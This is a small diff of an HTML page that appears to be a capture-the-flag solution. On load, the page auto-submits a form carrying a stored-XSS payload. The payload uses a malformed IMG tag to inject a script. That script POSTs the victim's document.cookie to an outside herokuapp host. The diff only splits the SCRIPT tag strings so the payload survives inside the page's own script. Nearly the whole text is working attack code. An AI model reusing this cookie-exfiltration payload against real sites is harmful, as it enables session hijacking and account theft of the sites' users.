@@ -8,8 +8,8 @@
   <input type="submit" value="Submit" id="s">
 </form>
 <script>
-var open='<IMG """><SCRIPT>';
-var close='</SCRIPT>">';
+var open='<IMG """><'+'SCRIPT>';
+var close='<'+'/SCRIPT>">';
 document.getElementById('m').value=open+"var xhr=new XMLHttpRequest();xhr.open('POST','https://www.ctf-solver.herokuapp.com/image',true);xhr.send(document.cookie)"+close;
 document.getElementById('s').click();
 </script>
